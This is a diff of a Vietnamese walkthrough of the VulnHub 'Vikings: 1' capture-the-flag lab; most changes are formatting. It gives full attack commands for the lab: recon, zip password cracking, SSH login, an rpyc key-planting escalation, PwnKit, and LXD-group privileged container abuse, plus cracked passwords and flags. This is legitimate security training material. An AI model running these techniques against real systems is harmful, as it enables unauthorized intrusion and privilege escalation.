@@ -1,4 +1,12 @@
-#                        *LINES - UP*
+<div class="cyber-hacker-box">
+  <h1 class="hacker-text" data-text="LINES - UP">LINES - UP</h1>
+  <div class="hacker-sub" style="text-align: right; margin-top: 15px; padding-right: 10px;">
+    <span style="font-size: 10.5pt; color: #7f8c8d; font-style: italic;">
+      Write-up by: <strong>VINH QUANG</strong>
+    </span>
+  </div>
+</div>
+<hr style="border: 0; border-top: 1px dashed #bdc3c7; margin-bottom: 40px;">
 
 
 # 🏴‍☠️ Vikings: 1 - VulnHub Walkthrough
@@ -33,13 +41,13 @@
 
 `arp-scan` là một công cụ cực kỳ mạnh mẽ, hoạt động ở Tầng liên kết dữ liệu (Layer 2) bằng cách gửi các gói tin ARP Request đến mọi địa chỉ trong dải IP nội bộ và nhận về ARP Reply.
 
-```
+```bash
 sudo arp-scan -l
 ```
 
 **Kết quả thu được:**
 
-```
+```bash
 Interface: eth0, type: EN10MB, MAC: 08:00:27:8a:35:d2, IPv4: 192.168.56.101
 Starting arp-scan 1.10.0 with 256 hosts ([https://github.com/royhills/arp-scan](https://github.com/royhills/arp-scan))
 192.168.56.100  08:00:27:0c:f3:17       (Unknown)
@@ -52,13 +60,13 @@ Starting arp-scan 1.10.0 with 256 hosts ([https://github.com/royhills/arp-scan](
 
 Công cụ này quét thụ động và chủ động các truy vấn ARP trong mạng để định danh các host đang hoạt động.
 
-```
+```bash
 sudo netdiscover -r 192.168.56.0/24
 ```
 
 **Kết quả thu được:**
 
-```
+```bash
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                        
 _____________________________________________________________________________   
 IP        At MAC Address   Count     Len  MAC Vendor / Hostname       
@@ -74,23 +82,23 @@ IP        At MAC Address   Count     Len  MAC Vendor / Hostname
 
 Sử dụng công cụ rà quét cổng kinh điển `Nmap` để thực hiện kiểm tra chi tiết các cổng dịch vụ đang mở trên hệ thống mục tiêu:
 
-```
+```zsh
 nmap -sC -sV 192.168.56.102 -oN nmap_report.txt
 ```
 
 **Kết quả quét Nmap:**
 
-```diff
+```text {5,10}
 Nmap scan report for 192.168.56.102
 Host is up (0.0018s latency).
 Not shown: 998 filtered tcp ports (no-response)
 PORT   STATE SERVICE VERSION
-+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   2048 59:d4:c0:fd:62:45:97:83:15:c0:15:b2:ac:25:60:99 (RSA)
 |   256 7e:37:f0:11:63:80:15:a3:d3:9d:43:c6:09:be:fb:da (ECDSA)
 |_  256 52:e9:4f:71:bc:14:dc:00:34:f2:a7:b3:58:b5:0d:ce (ED25519)
-+80/tcp open  http    Apache httpd 2.4.29
+80/tcp open  http    Apache httpd 2.4.29
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 | http-ls: Volume /
 | SIZE  TIME              FILENAME
@@ -109,7 +117,7 @@ Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## 🌐 4. Phase 3: Web Enumeration (Khai thác dịch vụ Web)
 
-### Bước 1: Tiếp cận thủ công (Manual Inspection)
+### Bước 1: Tiếp cận thủ công 
 
 Khi tiến hành truy cập trực tiếp vào đường dẫn `http://192.168.56.102/site/`, chúng ta chỉ thấy một trang trống. Tiến hành xem mã nguồn trang (F12 hoặc View Source) cũng không phát hiện bất kỳ chú thích hay đoạn script đặc biệt nào.
 
@@ -119,12 +127,11 @@ Khi tiến hành truy cập trực tiếp vào đường dẫn `http://192.168.5
 
 #### Cách 1: Sử dụng Gobuster (Dòng lệnh CLI)
 
-```
-gobuster dir -u http://192.168.56.102/site/ -w
-/usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,zip -t 100
+```bash
+gobuster dir -u http://192.168.56.102/site/ -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,zip -t 100
 ```
 **kết quả:**
-```bash
+```text {r22}
 ===============================================================
 Gobuster v3.8.2
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -167,6 +174,8 @@ Truy cập đường dẫn `/site/war/`, hệ thống hiển thị một gợi �
 
 Khi truy cập tiếp vào `http://192.168.56.102/site/war-is-over`, trang web hiển thị một khối ký tự ngẫu nhiên.
 
+![seven](./images/seven.jpg)
+
 ### Bước 2: Nhận diện và Giải mã dữ liệu
 
 Nhìn vào cấu trúc định dạng của chuỗi ký tự trên, ta nhận thấy đây chính là định dạng mã hóa **Base64** của 1 tệp zip. Chúng ta thực hiện tải dữ liệu thô này về máy bằng lệnh `curl`, sau đó giải mã ngược lại (`base64 -d`) để khôi phục tệp tin nén zip gốc:
@@ -189,6 +198,7 @@ Chúng ta xử lý bằng cách sử dụng công cụ nén mạnh mẽ hơn là
 ```
 7z x war.zip
 ```
+Phát hiện tệp `war.zip` yêu cầu mật khẩu
 
 ### Bước 4: Tấn công từ điển bằng John the Ripper
 
@@ -197,31 +207,33 @@ Tệp zip này đã được thiết lập mật khẩu bảo vệ. Chúng ta s�
 - **Trích xuất chuỗi hash mật khẩu từ tệp zip:**
     
 
-```
+```bash
 zip2john war.zip > war.hash
 ```
 
 - **Khởi chạy tiến trình bẻ khóa mật khẩu:**
     
 
-```
+```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt war.hash
 ```
-* **kết quả:**
-	
-```diff
+
+* **Kết quả:**
+
+```text {y7}
 Using default input encoding: UTF-8
 Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
 Cost 1 (HMAC size) is 1410760 for all loaded hashes
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 0g 0:00:00:03 1.13% (ETA: 12:23:14) 0g/s 51061p/s 51061c/s 51061C/s becky21..083081
--ragnarok123      (war.zip/king)     
+ragnarok123      (war.zip/king)     
 1g 0:00:00:05 DONE (2026-05-20 12:18) 0.1851g/s 55371p/s 55371c/s 55371C/s redsox#1..money66
 Use the "--show" option to display all of the cracked passwords reliably
-Session completed. 
+Session completed.
 ```
-> 🎉 **Kết quả tìm thấy mật khẩu giải nén:** **`ragnarok123`**
+
+> 🎉 **Tìm thấy mật khẩu giải nén:** **`ragnarok123`**
 
 ### Bước 5: Giải nén trích xuất dữ liệu
 
@@ -257,7 +269,7 @@ Nghi ngờ có dữ liệu quan trọng đang được giấu ẩn sâu bên tro
 binwalk king.jpeg
 ```
 
-```
+```text {g5}
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
 0             0x0             JPEG image data, EXIF standard
@@ -295,7 +307,7 @@ cat user
 
 Sử dụng tài khoản và mật khẩu vừa thu thập được ở trên để kết nối trực tiếp vào máy mục tiêu thông qua dịch vụ SSH:
 
-```
+```bash
 ssh floki@192.168.56.102
 ```
 
@@ -313,7 +325,7 @@ uid=1000(floki) gid=1000(floki) groups=1000(floki),4(adm),24(cdrom),30(dip),46(p
 
 ## 🏹 8. Phase 7: Tấn công leo hàng ngang - Floki sang Ragnar
 
-Sau khi đột nhập thành công với quyền `floki`, tiến hành khảo sát thư mục hiện hành (`/home/floki`), ta phát hiện hai tệp tin gợi ý cực kỳ quan trọng là `readme.txt` và `boat`.
+Sau khi đột nhập thành công với quyền `floki`, tiến hành khảo sát thư mục hiện hành (`/home/floki`), ta phát hiện hai tệp tin gợi ý là `readme.txt` và `boat`.
 
 - **Nội dung file `readme.txt`:**
     
@@ -366,9 +378,9 @@ print(*res)
 
 > 💡 **Mẹo xử lý nhanh:** Bạn có thể sao chép mảng kết quả số thô thu được từ đoạn code Python trên rồi ném vào công cụ trực tuyến **CyberChef** để dịch nhanh toàn bộ chuỗi số đó sang dạng ký tự.
 
-![four](./images/four.jpg)
+[![four](./images/four.jpg)](https://cyberchef.io/)
 
-🎉 **Mật khẩu ragnar tìm được là:** **`mR)|>^/Gky[gz=\.F#j5P(`**
+🎉 **Mật khẩu user ragnar tìm được là:** **`mR)|>^/Gky[gz=\.F#j5P(`**
 
 ### Bước 2: Đăng nhập vào tài khoản ragnar
 
@@ -380,14 +392,14 @@ su - ragnar
 
 Nhập mật khẩu phía trên, chúng ta đã chuyển quyền sang thành công sang user **`ragnar`**:
 
-```
+```bash
 whoami
 id
 ```
 
 **Kết quả:**
 
-```
+```bash
 ragnar
 uid=1001(ragnar) gid=1001(ragnar) groups=1001(ragnar)
 ```
@@ -396,7 +408,7 @@ uid=1001(ragnar) gid=1001(ragnar) groups=1001(ragnar)
 
 Kiểm tra thư mục gốc của người dùng ragnar và đọc nội dung file flag đầu tiên:
 
-```
+```bash
 cat user.txt
 ```
 
@@ -412,16 +424,16 @@ Dưới đây là **3 phương pháp leo quyền** đơn giản mà chúng ta c�
 
 Ngay khi chúng ta thực hiện chuyển quyền hoặc đăng nhập vào user `ragnar`, hệ thống lập tức xuất hiện một yêu cầu nhập mật khẩu cho lệnh `sudo` một cách bất thường:
 
-```
+```test {r2}
 Last login: Fri Sep  3 10:11:27 2021 from 10.42.0.1
-[sudo] password for ragnar: ragnar is not in the sudoers file.  
-This incident will be reported.
+[sudo] password for ragnar: 
+ragnar is not in the sudoers file. This incident will be reported.
 ```
 
 Hệ thống lập tức thông báo tài khoản `ragnar` hoàn toàn không nằm trong file cấu hình sudoers. Vậy lệnh `sudo` bí ẩn kia từ đâu tự động sinh ra?
 
 * Hint: Khi bạn đăng nhập hoặc mở một Terminal mới, hệ điều hành không chỉ mở ra một cửa sổ trống, mà nó sẽ kích hoạt một tiến trình Shell (như Bash, Zsh). Mặc định, hành động khởi tạo này sẽ tự động kích hoạt một chuỗi lệnh đọc file (gọi là `Shell Startup Scripts`)
-* Một số file startup:` .bash_profile , .bash_login , .bashrc , .profile , . . .`
+* Một số file startup:` .bash_profile , .bash_login , .bashrc , .profile , . . .` 
 
 #### Bước 2: Điều tra file cấu hình môi trường `.profile`
 
@@ -449,14 +461,20 @@ sudo python3 /usr/local/bin/rpyc_classic.py
 ss -tlnp
 ```
 
+Hoặc
+
+```
+netstat -tlnp
+```
+
 **Kết quả hiển thị:**
 
-```diff
+```text {g5}
  State   Recv-Q  Send-Q            Local Address:Port          Peer Address:Port         
  LISTEN  0       128                   0.0.0.0:80                 0.0.0.0:*            
  LISTEN  0       128                 127.0.0.53%lo:53             0.0.0.0:*            
  LISTEN  0       128                   0.0.0.0:22                 0.0.0.0:*            
-+LISTEN  0       128                 127.0.0.1:18812              0.0.0.0:*            
+ LISTEN  0       128                 127.0.0.1:18812              0.0.0.0:*            
  LISTEN  0       128                 127.0.0.1:36255              0.0.0.0:* 
 ```
 
@@ -475,7 +493,7 @@ ssh-keygen -t rsa
 
 Khi Terminal xuất hiện thông báo yêu cầu nhập đường dẫn lưu file, chúng ta nhập thủ công đường dẫn `/home/ragnar/id_rsa` để lưu khóa ngay tại thư mục Home của ragnar:
 
-```
+```text {y2}
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/ragnar/.ssh/id_rsa): /home/ragnar/id_rsa
 Enter passphrase (empty for no passphrase): [Nhấn Enter để trống]
@@ -484,7 +502,7 @@ Enter same passphrase again: [Nhấn Enter để trống]
 
 Quá trình này tạo ra hai tệp tin:
 
-- `id_rsa`: Khóa cá nhân (Private Key) .
+- `id_rsa`: Khóa riêng tư (Private Key) .
     
 - `id_rsa.pub`: Khóa công khai (Public Key).
     
@@ -523,16 +541,11 @@ python3 rpyc_exploit.py
 
 Khóa SSH của chúng ta đã được nạp thành công vào tài khoản Root. Kết nối SSH thẳng vào tài khoản Root bằng `Private Key` vừa sinh ra:
 
-```
+```bash
 ssh -i /home/ragnar/id_rsa root@192.168.56.102
 ```
 
-```d
-root@vikings:~# whoami
-root
-root@vikings:~# id
-uid=0(root) gid=0(root) groups=0(root)
-```
+![eight](./images/eight.jpg)
 
 ### 🔥 Phương pháp 2: Khai thác lỗ hổng PwnKit (CVE-2021-4034)
 
@@ -540,17 +553,17 @@ uid=0(root) gid=0(root) groups=0(root)
 
 #### Bước 1: Rà quét các tệp tin chứa thuộc tính đặc quyền SUID (SUID Files Enumeration)
 
-```
+```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
 
 Một kết quả cực kỳ đáng lưu ý xuất hiện trong danh sách:
 
-```diff
+```text {r4}
 . . .
   /bin/umount
   /bin/fusermount
-- /usr/lib/policykit-1/polkit-agent-helper-1
+  /usr/lib/policykit-1/polkit-agent-helper-1
   /usr/lib/dma/dma-mbox-create
   /usr/lib/openssh/ssh-keysign
   /usr/lib/dbus-1.0/dbus-daemon-launch-helper
@@ -668,6 +681,7 @@ uid=0(root) gid=0(root) groups=0(root)
 Đây là một kỹ thuật leo thang đặc quyền cực kỳ sạch sẽ và mạnh mẽ, không phụ thuộc vào các lỗ hổng tràn bộ nhớ hay lỗi bảo mật mã nguồn (Kernel/Service Exploit) mà lợi dụng trực tiếp cơ chế ảo hóa và cấu hình phân quyền hệ thống.
 
 [Link tham thảo steflan-security](https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/)
+
 #### Bước 1: Group Membership Check
 
 Hãy quay trở lại với thông tin định danh của người dùng ban đầu `floki`. Chạy lệnh `id` để xem các nhóm mà `floki` tham gia:
@@ -678,8 +692,9 @@ id
 
 **Kết quả:**
 
-```c
-uid=1000(floki) gid=1000(floki) groups=1000(floki),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
+```text {r2}
+uid=1000(floki) gid=1000(floki) groups=1000(floki),4(adm),24(cdrom),30(dip),46(plugdev),
+108(lxd)
 ```
 
 > 🔍 **Tại sao nhóm lxd lại tương đương với quyền Root?** **LXD (Linux Container Daemon)** là một trình quản lý container ảo hóa hệ thống. Khi một người dùng thuộc nhóm `lxd`, người đó có toàn quyền kiểm soát daemon LXD. Do daemon này chạy dưới quyền tối cao `root`, chúng ta có thể yêu cầu LXD khởi tạo một container mới ở chế độ **Privileged** (đặc quyền cao), sau đó gán (mount) toàn bộ ổ đĩa cứng thực tế của hệ thống Host (`/`) vào bên trong thư mục của container này.
@@ -692,7 +707,7 @@ uid=1000(floki) gid=1000(floki) groups=1000(floki),4(adm),24(cdrom),30(dip),46(p
 
 ##### Bước 2.1: Tải/Xây dựng Image Alpine trên máy tấn công Kali Linux
 
-```
+```bash
 git clone https://github.com/saghul/lxd-alpine-builder
 cd lxd-alpine-builder/
 sudo ./build-alpine
@@ -700,7 +715,7 @@ sudo ./build-alpine
 
 Khởi chạy máy chủ Web nhanh bằng Python để truyền tệp tin sang máy mục tiêu:
 
-```
+```bash
 python3 -m http.server 80
 ```
 
@@ -708,7 +723,7 @@ python3 -m http.server 80
 
 Trên phiên SSH của người dùng `floki` (hoặc chuyển đổi qua `su - floki`), thực hiện tải tệp tin ảnh ảo hóa về thư mục `/tmp`:
 
-```
+```bash
 wget http://192.168.56.101/alpine-v3.23-x86_64-20260520_0615.tar.gz
 ```
 
@@ -719,14 +734,14 @@ Khi đã có tệp tin Image, chúng ta tiến hành thực thi các lệnh qu�
 1. **Import Image vào thư viện LXD:**
     
 
-```
+```bash
 lxc image import ./alpine-v3.23-x86_64-20260520_0615.tar.gz --alias myimage 
 ```
 
 2. **Khởi tạo dịch vụ cấu hình LXD:**
     
 
-```
+```bash
 lxd init
 ```
 
@@ -737,7 +752,7 @@ lxd init
 3. **Mount toàn bộ thư mục gốc `/` của hệ điều hành Host vào thư mục `/mnt/root` bên trong container:**
     
 
-```
+```bash
 lxc init myimage mycontainer -c security.privileged=true 
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true 
 ```
@@ -745,7 +760,7 @@ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursiv
 4. **Khởi động Container:**
     
 
-```
+```bash
 lxc start mycontainer
 ```
 
@@ -753,7 +768,7 @@ lxc start mycontainer
 
 Bây giờ chúng ta chỉ cần ra lệnh thực thi một shell tương tác `/bin/sh` bên trong container ảo vừa khởi chạy:
 
-```
+```bash
 lxc exec mycontainer /bin/sh
 ```
 
@@ -775,10 +790,26 @@ Ngay khi lệnh được thực thi, chúng ta sẽ có ngay một Shell hoạt 
 
 Khi đã đạt được quyền hạn tối cao Root trên máy mục tiêu, tiến hành di chuyển thẳng vào thư mục `/root` để đọc nội dung của tệp tin flag cuối cùng:
 
-```
+```bash
 cd /root
 cat root.txt
 ```
+
+
+
+
+
+<hr style="border-top: 1px solid rgba(0, 0, 0, 0.75); margin-top: 80px;">
+<div class="signature-container">
+  <a href="https://www.facebook.com/quang.vinh.324550" target="_blank" class="cyber-signature">
+    Vinh Quang
+  </a>
+</div>
+
+
+
+
+
 
 ## User Flag: 4bf930187d0149a9e4374a4e823f867d
 ## Root Flag: f0b98d4387ff6da77317e582da98bf31
